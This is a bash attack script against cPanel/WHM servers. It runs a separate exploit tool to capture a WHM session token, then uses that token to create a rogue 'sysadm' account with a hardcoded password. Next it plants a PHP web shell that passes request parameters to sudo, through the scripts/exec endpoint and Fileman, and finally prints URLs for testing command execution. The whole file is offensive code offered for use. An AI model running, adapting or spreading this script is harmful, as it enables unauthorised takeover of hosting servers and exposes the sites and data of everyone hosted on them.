#!/bin/bash
TARGET="$1"
SHELL_NAME="${2:-.x.php}"
SHELL_CODE='<?php echo"<pre>";passthru("sudo ".$_REQUEST[c]);echo"</pre>";?>'

if [ -z "$TARGET" ]; then echo "Usage: $0 https://TARGET:2087"; exit 1; fi

OUTPUT=$(python3 cPanelSniper.py -u "$TARGET" 2>&1)
echo "$OUTPUT"

TOKEN=$(echo "$OUTPUT" | grep -oP 'Token\s*:\s*\K/cpsess\d+')
SESSION=$(echo "$OUTPUT" | grep -oP 'Session\s*:\s*\K[^ ]+')
HOST=$(echo "$TARGET" | sed 's|https://||;s|http://||')

if [ -z "$TOKEN" ] || [ -z "$SESSION" ]; then echo "[-] Failed"; exit 1; fi

echo "[+] Token: $TOKEN"
echo "[+] Session: $SESSION"

COOKIE_ENC=$(python3 -c "from urllib.parse import quote; print(quote('$SESSION'))")

echo "[*] Creating cPanel account..."
curl -sk -b "whostmgrsession=$COOKIE_ENC" \
    "https://${HOST}${TOKEN}/json-api/createacct?api.version=1&username=sysadm&domain=sysadm.local&password=Namisan99ARM@&plan=default"
echo ""

echo "[*] Planting shell..."
for P in "/usr/local/apache/htdocs/$SHELL_NAME" "/home/webadmin/public_html/$SHELL_NAME"; do
    CMD="echo '$SHELL_CODE' > $P"
    ENC=$(python3 -c "from urllib.parse import quote; print(quote('''$CMD'''))")
    curl -sk -b "whostmgrsession=$COOKIE_ENC" \
        "https://${HOST}${TOKEN}/json-api/scripts/exec?api.version=1&command=$ENC"
    echo ""
done

echo "[*] Trying Fileman..."
FCODE=$(python3 -c "from urllib.parse import quote; print(quote('$SHELL_CODE'))")
curl -sk -b "whostmgrsession=$COOKIE_ENC" \
    "https://${HOST}${TOKEN}/execute/Fileman/save_file_content?dir=/usr/local/apache/htdocs&file=$SHELL_NAME&content=$FCODE"

echo ""
echo "[+] Check: http://${HOST}/${SHELL_NAME}?c=id"
echo "[+] Check: http://${HOST}/~webadmin/${SHELL_NAME}?c=id"
